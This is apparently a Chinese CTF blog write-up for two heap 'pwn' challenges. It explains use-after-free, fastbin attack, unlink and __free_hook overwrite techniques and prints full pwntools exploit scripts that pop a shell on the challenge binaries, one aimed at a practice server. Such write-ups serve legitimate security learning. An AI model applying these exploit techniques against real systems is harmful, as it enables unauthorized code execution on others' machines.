---
title: 简单堆题write-up
date: 2021-03-04 11:03:54
categories: Write-Up
tags:
    - write-up
    - ctf
    - pwn
    - heap
---

## ACTF_2019_babyheap

经典的notebook题目结构, 堆利用当中最简单的类型

有
```

    ==============================
    This is a heap exploit demo  
    ==============================
    1. Create something           
    2. Delete something           
    3. Print something            
    4. Exit    
```
create, delete, print 三个选项。

创建的结构体如下

|||
|-|-|
|字符串指针|函数指针|

字符串也由`malloc()`创建，且可以任意指定其长度和内容。
`free()`的时候也没有清空内容。

利用思路很明显了：
create两次，其中字符串的内容不重要，只要保证其释放后不被放入`0x20`的fastbin中。

此处使这这两个字符串大小为`0x20`，因此他们被释放后会被放入`0x30`的字符串当中。

释放这两个note之后的fastbin如下


|0x20|
|-|
|note0|
|🠗|
|note1|


|0x30|
|-|
|String0|
|🠗|
|String1|

再次create,但申请的字符串大小为0x10（chunk大小即为0x20）。fastbin是FILO(first in last out)的，那么
```
    note2 = note1
    string2 = note0
```
题目bss段中贴心的准备了`/bin/sh`字符串，也有`system`函数。
在create时向string2中写入
```
    binsh地址 |  system的PLT表地址
```
print选项调用note0.函数指针，就能成功调用`system('/bin/sh')`，完整payload如下
```
    if len(sys.argv) >1 and sys.argv[1] == 'r':
        target = remote()
    else:
        target = process("./ACTF_2019_babyheap")
        if(len(sys.argv)>1) and sys.argv[1]=='g':
            gdb.attach(target)

    context.log_level='debug'

    binsh=0x602010
    system_plt = 0x4007A0
    def s(in_put):
        target.sendlineafter("choice: ",in_put)
        
        
    def create(size,content):
        s("1")
        target.recvuntil("size: \n")
        target.sendline(str(size))
        target.recvuntil("content: \n")
        target.send(content)
        
        
    def delete(index):
        s("2")
        target.recvuntil("index: \n")
        target.sendline(str(index))
        
        
    def pwn():
        create(0x20,"A"*8+"\n")
        create(0x20,"B"*8+"\n")
        
        delete(0)
        delete(1)
        create(0x10,p64(binsh)+p64(system_plt))

        #use print at index 0 to getshell after this


        target.interactive()


    pwn()
```
---
## WDB_2018_1st_babyheap
同样是菜单题目,设计的十分巧妙,涉及到了很多堆的知识点.
```
    I thought this is really baby.What about u?
    Loading.....
    1.alloc
    2.edit
    3.show
    4.free
    5.exit
    Choice:
```
漏洞点出在`4.free` 选项中,调用`free()`之后没有清空指针,存在UAF.
但是`2.edit`的使用次数被限制在了三次以内.

思路如下: 
1. 我们希望覆盖`__free_hook`为`system` (或者直接覆盖为一个one_gadget),因此我们需要泄露libc,并通过Unlink实现任意地址写
2. unsorted bin中的`fd`指向`main_arena`,我们需要将一个chunk放入unsorted bin并利用UAF泄露`main_arena`,以此泄露libc
同时,我们也要将chunk送入unsorted bin 以触发unlink

3. 程序只允许我们`malloc()` 0x20大小的内存(即0x30大小的chunk),因此我们需要通过UAF,overlap 与fastbin attack构造fake chunk
4. 想要实现步骤3, 需要我们泄露堆地址

那么先从泄露堆地址开始做
```
    alloc(0,"a\n")
    alloc(1,"b\n")
    free(1)
    free(0)

    show(0)
    heap_leak = u64(target.recv(6).ljust(8,'\x00'))
    success(hex(heap_leak))
```
fastbin是FILO的,两次`free`之后,fastbins 如下
|fastbin|
|-|
|chunk0 @index0|
|🠗|
|chunk1 @index1|

chunk0->fd指向chunk1,因此`show(0)`可以泄露出chunk1的Prev_size地址(即heap+0x30)
注意此处释放顺序,第一个chunk地址低字节是\x00且程序为小端序,因此调换释放顺序后,我们无法用chunk1泄露chunk0的地址.

然后进行fastbin attack,构造chunk重叠
```
    edit(0,p64(heap_leak-0x10)+p64(0)+p64(0)+p64(0x31))
```
如此,chunk0的fd便指向 chunk1-0x10, 也就是chunk0+0x20的位置.
我们那里构建一个size为0x30的fake chunk,造成chunk重叠.

接着进行分配,要记得fastbin是FILO的
```
    alloc(6,"aaaa\n")  #chunk0 @index6
    alloc(7,p64(0)+p64(0xa1)+"\n") #fake chunk @index7
```
我们获取到的fake chunk @index7指向 chunk1-0x10,因此对其mem区域进行编辑,便能够编辑到 chunk1的size.

将该fakechunk填充至0x90 大小
```
    alloc(2,"CCCCCCC\n")
    alloc(3,"DDDDDDD\n")
```

最终的任意地址写需要依靠unlink实现,此处开始构造
chunk4 @index4 的prev_size 与 size会被算在fake chunk内,因此我们可以再伪造一个fake chunk.
0x602080即是index4地址

剩下的就是常规绕过unlink检查的操作,
```
    #bypass unlink check
    alloc(4,p64(0)+p64(0x31)+p64(0x602080-0x18)+p64(0x602080-0x10))
    alloc(5,p64(0x30)+p64(0x30)+'\n')
```
释放0xa1大小的fake chunk, 他会被放入unsorted bin中.
回顾, unsorted bin中的`fd`指向`main_arena`, 依此泄露出libc
```
    free(1)
    show(1)
```
同时,我们也触发了unlink,index4(0x602080) 会指向 index1 (0x602080-0x18 = 0x602068)

之后利用edit函数实现任意地址写,改`__free_hook` 为 `system`.
类似地,我们也可以改`__free_hook`为one_gadget
```
    edit(4,p64(free_hook)+"\n")
    edit(1,p64(system)+"\n")

    alloc(8,"/bin/sh\x00"+'\n')
    free(8)
```
完整exp
```
    from pwn import *
    import sys


    if len(sys.argv) >1 and sys.argv[1] == 'r':
        target = remote("node3.buuoj.cn",26070 )
    else:
        #target = process("")
        target=process(["/home/trident/ctfworkspace/glibc/glibc-all-in-one-master/libs/2.23-0ubuntu11.2_amd64/ld-2.23.so","./wdb_2018_1st_babyheap"],env={"LD_PRELOAD":"./libc.so.6"})
        if(len(sys.argv)>1) and sys.argv[1]=='g':
            gdb.attach(target)

    context.log_level='debug'
    #context.update(arch='')
    #gdb.attach(target)
    libC = ELF("./libc.so.6")


    def alloc(index,content):
        target.recvuntil("oice:")
        target.sendline("1")

        target.recvuntil("Index:")
        target.sendline(str(index))
        target.recvuntil("tent:")
        target.send(content)

    def edit(index,content):
        target.recvuntil("oice:")
        target.sendline("2")
        target.recvuntil("Index:")
        target.sendline(str(index))
        target.recvuntil("tent:")
        target.send(content)


    def show(index):
        target.recvuntil("oice:")
        target.sendline("3")
        target.recvuntil("Index:")
        target.sendline(str(index))


    def free(index):
        target.recvuntil("oice:")
        target.sendline("4")
        target.recvuntil("Index:")
        target.sendline(str(index))



    def pwn():
        alloc(0,"a\n")
        alloc(1,"b\n")
        free(1)
        free(0)
        
        show(0)
        heap_leak = u64(target.recv(6).ljust(8,'\x00')) 
        success(hex(heap_leak))
        
        edit(0,p64(heap_leak-0x10)+p64(0)+p64(0)+p64(0x31))
        
        alloc(6,"aaaa\n")
        alloc(7,p64(0)+p64(0xa1)+"\n")
        alloc(2,"CCCCCCC\n")
        alloc(3,"DDDDDDD\n")

        alloc(4,p64(0)+p64(0x31)+p64(0x602080-0x18)+p64(0x602080-0x10)) #bypass unlink check
        alloc(5,p64(0x30)+p64(0x30)+'\n')
        


        free(1)
        show(1)
        
        leak2 = u64(target.recv(6).ljust(8,'\x00'))
        success(hex(leak2))
        libc_leak = leak2 - 0x3c4b78
        success("leaked libc: " + hex(libc_leak))
        

        system = libc_leak + 0x45390
        success("system: " + hex(system))
        free_hook = libc_leak + libC.symbols['__free_hook']
        success("free_hook: "+hex(free_hook))
        
        edit(4,p64(free_hook)+"\n")
        edit(1,p64(system)+"\n")
        
        alloc(8,"/bin/sh\x00"+'\n')
        free(8)

        target.interactive()


    pwn()
```
